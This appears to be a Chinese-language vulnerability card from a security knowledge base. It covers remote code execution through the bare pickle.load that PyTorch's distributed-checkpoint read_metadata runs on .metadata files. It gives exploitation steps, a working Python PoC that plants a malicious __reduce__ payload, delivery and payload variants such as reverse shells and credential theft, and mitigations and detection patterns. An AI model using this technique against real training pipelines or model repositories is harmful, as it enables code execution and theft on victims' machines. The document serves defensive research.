---
id: ai-security-supply-chain-pytorch-dcp-read-metadata-pickle-rce
title: PyTorch 分布式检查点 FileSystemReader.read_metadata 裸 pickle.load 解析 .metadata：加载恶意检查点即 RCE（≤2.6.0）
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: pytorch-dcp-read-metadata-pickle-rce
tags:
- ai-security
- supply-chain
- pytorch
- distributed-checkpoint
- pickle
- deserialization
- rce
- model-loading
- checkpoint
cve: []
severity: high
confidence: high
affected_versions: <= 2.6.0（原文：所有版本直到 2.6.0，最新至 2025 年 10 月）
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V165
  verified_at: '2026-11-06T13:51:46+08:00'
  notes: 已对照原文及图01-05核对：read_metadata 裸 pickle.load(.metadata)、MaliciousMetadata 嵌套触发 __reduce__、图01 CWE-502/CVSS 8.8/影响至 2.6.0、图02-03 复现成功一致；已修正原文复现环境为 macOS（截图 /Users 与 /var/folders 路径）；未复跑
url: /docs/ai-security/supply-chain/ai-security-supply-chain-pytorch-dcp-read-metadata-pickle-rce/
draft: false
kb_aliases:
- PyTorch Distributed Checkpoint RCE
- FileSystemReader.read_metadata
- .metadata pickle.load
- torch.distributed.checkpoint 反序列化
- 恶意检查点元数据
- DCP metadata RCE
---

## 一句话结论

PyTorch 分布式检查点（DCP）的 `FileSystemReader.read_metadata()` 会直接对检查点目录下的 `.metadata` 文件调用 `pickle.load()`，既不校验文件来源，也没有类白名单；攻击者构造一个内嵌恶意 `__reduce__` 对象的 `.metadata`，受害者用 `FileSystemReader` 加载该检查点时，命令在反序列化阶段立即执行。原文称截至 PyTorch 2.6.0（2025 年 10 月最新版）仍可复现，官方以“重复漏洞”为由未修复。

## 原理

- **检查点目录结构**：PyTorch DCP 的检查点是一个目录，包含 `.metadata`（描述 state_dict 分片、storage、planner 信息）和若干数据分片文件。`FileSystemReader(path)` 把用户提供的 `path` 存为检查点根目录。
- **路径可控**：`read_metadata()` 通过 `_get_metadata_path(rank)` 拼出 `path/.metadata` 或 `path/__{rank}.metadata`，然后用 `self.fs.create_stream(path, "rb")` 打开。`path` 来自调用方（`--resume-from`、HuggingFace 下载目录、MLOps 上传目录、共享存储前缀等），完全由外部输入决定。
- **危险 sink**：打开文件后代码执行 `metadata = pickle.load(metadata_file)`（原文定位 `torch/distributed/checkpoint/filesystem.py` 约 930 行）。这里没有 `weights_only` 参数、没有 RestrictedUnpickler、没有来源或哈希校验；pickle 在还原对象时会调用对象 `__reduce__()` 返回的 callable 与参数，因此 `return (os.system, (cmd,))` 就是任意命令执行。
- **与张量分片路径的差异**：同一模块读取张量数据时使用 `torch.load(..., weights_only=True)`，但元数据走的是裸 `pickle.load`，`weights_only` 的安全限制完全不适用；攻击者不需要伪造合法张量，也不需要模型结构匹配。
- **为什么要包一层 MaliciousMetadata**：`read_metadata()` 期望返回带 `state_dict_metadata`、`storage_meta` 等字段的 Metadata 对象，后续还会访问 `metadata.storage_meta`。直接序列化一个裸 payload 可能在反序列化/后续属性访问阶段报错；把 payload 放进 `state_dict_metadata` 字典的值里，pickle 在重建该字典时就会触发 `__reduce__`，命令在返回前执行，外层对象也满足后续字段访问。
- **触发时机**：恶意代码在 `pickle.load` 反序列化过程中执行，早于任何检查点内容校验或张量组装；即使检查点其他文件缺失、加载最终失败，命令也已经执行。
- **版本与修复**：原文截图标注受影响版本为“所有版本直到 2.6.0（最新至 2025 年 10 月）”，CVSS 8.8、CWE-502；文章称官方认定重复漏洞未修复，最新版仍可复现。作者给出的缓解方案是自定义 `RestrictedUnpickler.find_class()` 只允许 `Metadata`、`StorageMeta`、`TensorStorageMetadata`、`torch.Storage`、基础类型、`OrderedDict` 等白名单类，并为 `read_metadata` 增加默认开启的 `safe_mode`。

## 触发条件

- 目标使用包含该实现的 PyTorch 版本（原文称 ≤ 2.6.0），且 `torch.distributed.checkpoint` 可用。
- 受害者使用 `FileSystemReader` 加载攻击者可控目录中的检查点，或调用 `dist_cp.load`/恢复训练时走到 `read_metadata()`。
- 攻击者能写入或投递检查点目录中的 `.metadata` 文件：HuggingFace 模型/检查点仓库、共享 NFS/S3、MLOps 平台上传、CI 产物、断点续训路径等。
- 加载进程具备命令执行权限（通常为训练/推理节点用户），且没有在隔离沙箱中解析元数据。

## 利用步骤

1. 定义 `MaliciousPayload`，`__reduce__()` 返回 `(os.system, (cmd,))`；cmd 可为 `touch /tmp/pwned`、反弹 shell、下载二阶段载荷等。
2. 定义 `MaliciousMetadata`，构造 `state_dict_metadata = {'malicious': MaliciousPayload()}`，并补齐 `planner_data`、`storage_data`、`storage_meta`、`version` 等字段。
3. 用 `pickle.dump` 把该对象写入检查点目录的 `.metadata`（多 rank 场景为 `__{rank}.metadata`），可再放入若干合法分片文件降低怀疑。
4. 通过模型仓库、共享存储、上传接口或 `--resume-from` 让受害者指向该目录。
5. 受害者调用 `dist_cp.FileSystemReader(checkpoint_dir).read_metadata()`（或分布式加载流程内部调用）时，`pickle.load` 触发 `__reduce__`，命令执行。
6. 验证落地文件/回连；授权测试只用无害命令并清理。

## PoC

```python
import os
import pickle
import tempfile
import shutil
from pathlib import Path


class MaliciousPayload:
    def __reduce__(self):
        return (os.system, (
            'touch /tmp/pytorch_pwned && '
            'echo "pwned" > /tmp/pytorch_pwned',
        ))


class MaliciousMetadata:
    def __init__(self):
        self.state_dict_metadata = {}
        self.planner_data = None
        self.storage_data = None
        self.storage_meta = None
        self.version = "1.0.0"
        self.state_dict_metadata['malicious'] = MaliciousPayload()


def create_malicious_checkpoint():
    checkpoint_dir = tempfile.mkdtemp(prefix="pytorch_malicious_")
    metadata_path = Path(checkpoint_dir) / ".metadata"
    with open(metadata_path, 'wb') as f:
        pickle.dump(MaliciousMetadata(), f)
    return checkpoint_dir


checkpoint_dir = create_malicious_checkpoint()
try:
    import torch.distributed.checkpoint as dist_cp

    storage_reader = dist_cp.FileSystemReader(checkpoint_dir)
    metadata = storage_reader.read_metadata()   # 触发 pickle.load
    print(os.path.exists('/tmp/pytorch_pwned'))
finally:
    shutil.rmtree(checkpoint_dir)
```

原文在 macOS 环境（截图中路径为 `/Users/...`、临时目录 `/var/folders/...`）运行后 `/tmp/pytorch_pwned` 生成，内容为 `先知社区yyds`；本卡未在本机复跑。

## 变体与关联

- **投递变体**：HuggingFace `snapshot_download` 下载的模型/检查点目录；训练脚本 `--resume-from`；MLOps 平台的“上传检查点”接口；NFS/S3/对象存储中的共享检查点前缀；CI 缓存与模型转换产物。
- **结构变体**：把 payload 放在 `state_dict_metadata`、`planner_data` 或任意会被 pickle 遍历的字段；多 rank 时文件名改为 `__{rank}.metadata`；可与合法 Metadata 字段混合，使反序列化后表面上仍是正常元数据。
- **载荷变体**：`os.system`、`subprocess`、反弹 shell、读取环境变量/云凭证并外带、写 SSH key；pickle 的 `__reduce__` 也可调用其他可导入 callable。
- **同类 sink**：`DefaultLoadPlanner.load_bytes` 的 `weights_only=False`（见关联卡）、`torch.load` 未设 `weights_only`、`torch.export.load` 的 `use_pickle` 等；DCP 元数据这条是独立的 `pickle.load` 路径。
- **关联卡片**：[[ai-security-supply-chain-pytorch-dcp-load-bytes-weights-only-pickle-rce]]（同属 DCP，但 sink 是 BYTE_IO 的 `torch.load(weights_only=False)`，不是 `.metadata` 的 `pickle.load`）、[[ai-security-supply-chain-vllm-torch-load-weights-only-pickle-rce]]、[[ai-security-supply-chain-huggingface-pickle-model-reverse-shell]]、[[ai-security-supply-chain-pytorch-export-load-use-pickle-rce]]。
- **边界**：若目标版本已改用受限 Unpickler、对 `.metadata` 做签名/哈希校验、或只在沙箱中解析检查点，则不能直接执行；PyTorch 后续版本可能调整实现，实际利用前需确认目标源码中的 `read_metadata()` 是否仍为裸 `pickle.load`。

## 检测与防御

- **修复**：把 `read_metadata()` 的 `pickle.load` 替换为 `RestrictedUnpickler`，只允许 Metadata/StorageMeta/TensorStorageMetadata/torch.Storage/基础容器等白名单类；或增加默认开启的 `safe_mode`，非安全模式显式告警。升级到已修复该实现的 PyTorch 版本。
- **来源校验**：检查点必须来自可信来源并做签名/哈希校验；禁止从用户可控路径、共享存储或任意 HuggingFace 仓库直接恢复训练。
- **沙箱**：在无网络、低权限、只读根文件系统的容器中解析检查点元数据；把 `.metadata` 解析与训练主进程隔离。
- **检测**：对检查点目录中的 `.metadata` 做 pickle 静态扫描（`GLOBAL`/`STACK_GLOBAL`/`os.system`/`subprocess`/`socket` 等）；监控加载进程拉起 shell、写入 `/tmp`/cron/`authorized_keys` 或异常外连；审计 `--resume-from` 与上传接口的路径来源。
- **响应**：隔离恶意检查点，排查同批次其他检查点；清理落地文件与持久化项，轮换训练节点凭据，升级 PyTorch 并收紧检查点加载权限。
